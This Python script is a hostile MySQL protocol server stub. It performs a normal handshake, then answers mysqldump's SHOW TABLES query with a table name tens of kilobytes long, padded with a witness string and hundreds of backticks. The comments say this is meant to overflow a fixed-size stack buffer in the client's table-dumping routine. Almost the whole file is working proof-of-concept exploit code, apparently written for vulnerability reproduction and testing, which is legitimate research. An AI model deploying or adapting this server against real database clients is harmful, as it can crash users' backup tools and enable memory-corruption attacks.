#!/usr/bin/env python3
"""Hostile MySQL protocol stub: greeting + SHOW TABLES row of chosen length."""

from __future__ import annotations

import os
import re
import socket
import struct
import threading
import traceback

WITNESS = os.environ.get("WITNESS", "MYSQL-DUMP-SHOW-TABLES-OVERFLOW-WITNESS")
CONTROL_PORT = int(os.environ.get("CONTROL_PORT", "3306"))
OVERFLOW_PORT = int(os.environ.get("OVERFLOW_PORT", "3307"))
BIND_HOST = os.environ.get("BIND_HOST", "0.0.0.0")
SERVER_VERSION = "26.7.0"
# dump_all_tables_in_db also has bool real_columns[MAX_FIELDS] (4000) on
# the same frame as hash_key[386]; a few KB is absorbed without a signal.
OVERFLOW_BYTES = int(os.environ.get("OVERFLOW_BYTES", "65536"))

CLIENT_LONG_PASSWORD = 1
CLIENT_FOUND_ROWS = 2
CLIENT_LONG_FLAG = 4
CLIENT_CONNECT_WITH_DB = 8
CLIENT_PROTOCOL_41 = 512
CLIENT_TRANSACTIONS = 8192
CLIENT_SECURE_CONNECTION = 32768
CLIENT_MULTI_RESULTS = 1 << 17
CLIENT_PS_MULTI_RESULTS = 1 << 18
CLIENT_PLUGIN_AUTH = 1 << 19
CLIENT_CONNECT_ATTRS = 1 << 20
CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA = 1 << 21
CLIENT_DEPRECATE_EOF = 1 << 24

SERVER_STATUS_AUTOCOMMIT = 0x0002

COM_QUIT = 0x01
COM_INIT_DB = 0x02
COM_QUERY = 0x03
COM_FIELD_LIST = 0x04
COM_PING = 0x0E
COM_STATISTICS = 0x09
COM_RESET_CONNECTION = 0x1F

MYSQL_TYPE_VAR_STRING = 0xFD
CHARSET_UTF8MB4 = 45

SERVER_CAPS = (
    CLIENT_LONG_PASSWORD
    | CLIENT_FOUND_ROWS
    | CLIENT_LONG_FLAG
    | CLIENT_CONNECT_WITH_DB
    | CLIENT_PROTOCOL_41
    | CLIENT_TRANSACTIONS
    | CLIENT_SECURE_CONNECTION
    | CLIENT_MULTI_RESULTS
    | CLIENT_PS_MULTI_RESULTS
    | CLIENT_PLUGIN_AUTH
    | CLIENT_CONNECT_ATTRS
    | CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA
    | CLIENT_DEPRECATE_EOF
)

SCRAMBLE = b"a" * 20
_thread_ids = 0
_tid_lock = threading.Lock()


def log(msg: str) -> None:
    print(msg, flush=True)


def next_thread_id() -> int:
    global _thread_ids
    with _tid_lock:
        _thread_ids += 1
        return _thread_ids


def lenenc_int(n: int) -> bytes:
    if n < 251:
        return bytes([n])
    if n < 2**16:
        return b"\xfc" + struct.pack("<H", n)
    if n < 2**24:
        return b"\xfd" + struct.pack("<I", n)[:3]
    return b"\xfe" + struct.pack("<Q", n)


def lenenc_str(data: bytes | str) -> bytes:
    if isinstance(data, str):
        data = data.encode("utf-8")
    return lenenc_int(len(data)) + data


def recvall(sock: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def read_packet(sock: socket.socket) -> tuple[int, bytes] | None:
    hdr = recvall(sock, 4)
    if not hdr:
        return None
    length = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
    seq = hdr[3]
    payload = recvall(sock, length) if length else b""
    if payload is None:
        return None
    return seq, payload


def send_packet(sock: socket.socket, seq: int, payload: bytes) -> int:
    length = len(payload)
    hdr = bytes((length & 0xFF, (length >> 8) & 0xFF, (length >> 16) & 0xFF, seq & 0xFF))
    sock.sendall(hdr + payload)
    return seq + 1


def ok_payload(header: int = 0x00) -> bytes:
    return (
        bytes([header, 0x00, 0x00])
        + struct.pack("<H", SERVER_STATUS_AUTOCOMMIT)
        + struct.pack("<H", 0)
    )


def err_payload(errno: int, sqlstate: str, msg: str) -> bytes:
    return (
        b"\xff"
        + struct.pack("<H", errno)
        + b"#"
        + sqlstate.encode("ascii")
        + msg.encode("utf-8")
    )


def handshake_payload(thread_id: int) -> bytes:
    caps_low = SERVER_CAPS & 0xFFFF
    caps_high = (SERVER_CAPS >> 16) & 0xFFFF
    payload = bytearray()
    payload.append(10)
    payload.extend(SERVER_VERSION.encode("ascii") + b"\x00")
    payload.extend(struct.pack("<I", thread_id))
    payload.extend(SCRAMBLE[:8])
    payload.append(0)
    payload.extend(struct.pack("<H", caps_low))
    payload.append(CHARSET_UTF8MB4)
    payload.extend(struct.pack("<H", SERVER_STATUS_AUTOCOMMIT))
    payload.extend(struct.pack("<H", caps_high))
    payload.append(21)
    payload.extend(b"\x00" * 10)
    payload.extend(SCRAMBLE[8:] + b"\x00")
    payload.extend(b"mysql_native_password\x00")
    return bytes(payload)


def parse_handshake_response(payload: bytes) -> tuple[int, str]:
    if len(payload) < 32:
        return 0, ""
    caps = struct.unpack_from("<I", payload, 0)[0]
    pos = 4 + 4 + 1 + 23
    z = payload.find(b"\x00", pos)
    if z < 0:
        return caps, ""
    pos = z + 1
    if caps & CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA:
        if pos >= len(payload):
            return caps, ""
        first = payload[pos]
        if first < 251:
            alen = first
            pos += 1
        elif first == 0xFC and pos + 3 <= len(payload):
            alen = struct.unpack_from("<H", payload, pos + 1)[0]
            pos += 3
        else:
            return caps, ""
        pos += alen
    elif caps & CLIENT_SECURE_CONNECTION:
        if pos >= len(payload):
            return caps, ""
        alen = payload[pos]
        pos += 1 + alen
    else:
        z = payload.find(b"\x00", pos)
        pos = len(payload) if z < 0 else z + 1
    if caps & CLIENT_CONNECT_WITH_DB:
        z = payload.find(b"\x00", pos)
        if z < 0:
            return caps, ""
        pos = z + 1
    plugin = ""
    if caps & CLIENT_PLUGIN_AUTH:
        z = payload.find(b"\x00", pos)
        if z >= 0:
            plugin = payload[pos:z].decode("ascii", "replace")
    return caps, plugin


def column_def(name: str) -> bytes:
    nb = name.encode("utf-8")
    payload = bytearray()
    payload.extend(lenenc_str(b"def"))
    payload.extend(lenenc_str(b""))
    payload.extend(lenenc_str(b""))
    payload.extend(lenenc_str(b""))
    payload.extend(lenenc_str(nb))
    payload.extend(lenenc_str(nb))
    payload.append(0x0C)
    payload.extend(struct.pack("<H", CHARSET_UTF8MB4))
    payload.extend(struct.pack("<I", 16 * 1024 * 1024))
    payload.append(MYSQL_TYPE_VAR_STRING)
    payload.extend(struct.pack("<H", 0))
    payload.append(0)
    payload.extend(b"\x00\x00")
    return bytes(payload)


def send_result(
    sock: socket.socket,
    seq: int,
    columns: list[str],
    rows: list[list[bytes]],
    deprecate_eof: bool,
) -> None:
    seq = send_packet(sock, seq, lenenc_int(len(columns)))
    for col in columns:
        seq = send_packet(sock, seq, column_def(col))
    if not deprecate_eof:
        seq = send_packet(sock, seq, ok_payload(0xFE))
    for row in rows:
        body = b"".join(lenenc_str(cell) for cell in row)
        seq = send_packet(sock, seq, body)
    send_packet(sock, seq, ok_payload(0xFE if deprecate_eof else 0xFE))


def overflow_table_name() -> bytes:
    pad = max(OVERFLOW_BYTES, 8192)
    # Long identifier plus witness. Extra backticks also smash quote_name doubling.
    core = ("A" * pad) + WITNESS + ("`" * 512)
    return core.encode("ascii")


def handle_query(
    sock: socket.socket,
    seq: int,
    query: str,
    table_name: bytes,
    deprecate_eof: bool,
    peer: str,
) -> None:
    q = query.strip().strip(";")
    q_l = q.lower()
    log(f"query peer={peer} sql={query!r}")

    if re.search(r"\bshow\s+tables\b", q_l):
        send_result(
            sock,
            seq,
            ["Tables_in_testdb"],
            [[table_name]],
            deprecate_eof,
        )
        return

    # SET / LOCK / FLUSH must be OK packets. Do this before matching
    # "information_schema" inside SET SESSION information_schema_stats_expiry.
    if (
        re.search(r"\bset\b", q_l)
        and not re.search(r"\bselect\b", q_l)
        and not re.search(r"\bshow\b", q_l)
    ):
        send_packet(sock, seq, ok_payload())
        return

    if re.search(r"\bselect\b", q_l) and re.search(r"version", q_l):
        send_result(sock, seq, ["version()"], [[SERVER_VERSION.encode("ascii")]], deprecate_eof)
        return

    # Empty result sets (not errors) so mysqldump reaches SHOW TABLES.
    if re.search(r"\bshow\s+variables\b", q_l) or (
        re.search(r"\bselect\b", q_l)
        and re.search(r"information_schema|performance_schema|column_masking_policy", q_l)
    ):
        send_result(sock, seq, ["Value"], [], deprecate_eof)
        return

    # Later SHOW/SELECT in dump_table NULL-deref on an empty row; send a
    # SQL error so CONTROL exits 1/2 without a signal.
    if re.search(r"\bselect\b", q_l) or re.search(r"\bshow\b", q_l):
        send_packet(
            sock,
            seq,
            err_payload(1146, "42S02", "Table 'testdb.t' doesn't exist"),
        )
        return

    send_packet(sock, seq, ok_payload())


def handle_client(conn: socket.socket, addr, table_name: bytes, label: str) -> None:
    peer = f"{addr[0]}:{addr[1]}"
    log(f"accept label={label} peer={peer}")
    conn.settimeout(30)
    try:
        tid = next_thread_id()
        send_packet(conn, 0, handshake_payload(tid))
        pkt = read_packet(conn)
        if pkt is None:
            return
        _seq, payload = pkt
        caps, plugin = parse_handshake_response(payload)
        log(f"handshake label={label} peer={peer} caps=0x{caps:08x} plugin={plugin!r}")
        seq = 2
        if plugin and plugin not in ("mysql_native_password", ""):
            switch = b"\xfe" + b"mysql_native_password\x00" + SCRAMBLE + b"\x00"
            seq = send_packet(conn, seq, switch)
            nxt = read_packet(conn)
            if nxt is None:
                return
            seq = nxt[0] + 1
        send_packet(conn, seq, ok_payload())
        deprecate_eof = bool(caps & CLIENT_DEPRECATE_EOF)

        while True:
            pkt = read_packet(conn)
            if pkt is None:
                return
            _cseq, command = pkt
            if not command:
                continue
            cmd = command[0]
            body = command[1:]
            if cmd == COM_QUIT:
                log(f"quit label={label} peer={peer}")
                return
            if cmd in (COM_PING, COM_RESET_CONNECTION, COM_STATISTICS):
                send_packet(conn, 1, ok_payload())
                continue
            if cmd == COM_INIT_DB:
                db = body.split(b"\x00", 1)[0].decode("utf-8", "replace")
                log(f"init_db label={label} peer={peer} db={db!r}")
                send_packet(conn, 1, ok_payload())
                continue
            if cmd == COM_FIELD_LIST:
                send_result(conn, 1, ["Field"], [], deprecate_eof)
                continue
            if cmd == COM_QUERY:
                sql = body.decode("utf-8", "replace")
                handle_query(conn, 1, sql, table_name, deprecate_eof, peer)
                continue
            log(f"unknown-cmd label={label} peer={peer} cmd=0x{cmd:02x} len={len(body)}")
            send_packet(conn, 1, ok_payload())
    except (TimeoutError, socket.timeout, ConnectionResetError, BrokenPipeError, OSError) as exc:
        log(f"disconnect label={label} peer={peer} err={exc}")
    except Exception:
        log(f"stub-error label={label} peer={peer}\n{traceback.format_exc()}")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve(port: int, table_name: bytes, label: str) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((BIND_HOST, port))
    sock.listen(16)
    log(f"listen label={label} bind={BIND_HOST}:{port} table_len={len(table_name)}")
    while True:
        conn, addr = sock.accept()
        threading.Thread(
            target=handle_client,
            args=(conn, addr, table_name, label),
            daemon=True,
        ).start()


def main() -> None:
    control_name = b"t"
    overflow_name = overflow_table_name()
    log(
        f"stub start control={BIND_HOST}:{CONTROL_PORT} overflow={BIND_HOST}:{OVERFLOW_PORT} "
        f"overflow_len={len(overflow_name)} witness={WITNESS}"
    )
    threading.Thread(
        target=serve, args=(CONTROL_PORT, control_name, "control"), daemon=True
    ).start()
    serve(OVERFLOW_PORT, overflow_name, "overflow")


if __name__ == "__main__":
    main()
